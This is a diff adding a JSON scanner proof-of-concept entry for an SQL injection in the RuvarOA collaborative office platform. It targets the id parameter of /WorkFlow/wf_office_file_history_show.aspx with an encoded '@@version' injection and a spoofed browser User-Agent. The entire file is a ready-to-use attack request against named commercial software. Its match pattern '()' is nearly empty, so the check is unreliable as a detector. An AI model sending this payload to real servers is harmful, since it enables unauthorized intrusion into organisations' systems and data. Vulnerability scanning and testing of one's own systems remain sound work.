@@ -1,0 +1,14 @@
+{
+	"name":"RuvarOA协同办公平台SQL注入5",
+	"tag":"OA",
+	"type":"other",
+	"poc":{
+		"pocGet":"/WorkFlow/wf_office_file_history_show.aspx?id=1%27%20and%20%28@@version%29%3E0--",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33",
+			"Connection":" close"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
